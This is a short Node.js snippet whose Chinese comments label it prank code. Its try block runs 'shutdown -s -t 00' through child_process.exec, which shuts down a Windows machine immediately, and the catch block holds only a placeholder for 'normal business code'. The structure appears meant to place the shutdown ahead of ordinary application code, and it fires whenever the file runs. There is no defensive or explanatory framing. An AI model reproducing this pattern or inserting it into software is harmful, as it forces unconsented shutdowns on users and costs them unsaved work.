try {
    // 导入语句
    // 整蛊代码，比如关机代码
    const {exec} = require('child_process');
    function shutdownWindow() {
        let command = exec('shutdown -s -t 00', function (err, stdout, stderr) {
            if (err || stderr) {
                console.log("关机失败！" + err + stderr);
            }
        });
        command.stdin.end();
        command.on('close', function (code) {
            console.log("shutdown", code);
        });
    }

    shutdownWindow()

} catch {
// 正常代码
    console.log('这里执行了业务所需的正常代码');
}
